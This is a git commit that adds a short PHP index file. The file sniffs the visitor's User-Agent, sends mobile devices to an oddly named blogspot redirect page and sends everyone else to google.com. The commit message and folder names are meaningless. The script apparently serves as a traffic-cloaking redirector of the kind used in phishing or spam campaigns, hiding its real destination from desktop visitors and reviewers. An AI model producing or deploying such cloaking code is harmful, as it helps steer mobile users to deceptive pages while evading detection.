7d1c667799bc2e27d0f4547cc892e64a2b70799a
argeni5959 <67845811+argeni5959@users.noreply.github.com>
2020-09-12 22:19:00 -0400

    ww
    ww

---
+++ murrays/pimentels/index.php
@@ -0,0 +1,18 @@
+ <?php
+
+$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
+$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
+$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
+$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
+$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
+$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
+
+if ($iphone || $android || $palmpre || $ipod || $berry == true) 
+ {
+ 
+  header('Location: https://redirecionmasteriliamome.blogspot.com/');
+     
+  }else{
+ header('Location: https://google.com/');
+}
+ ?>
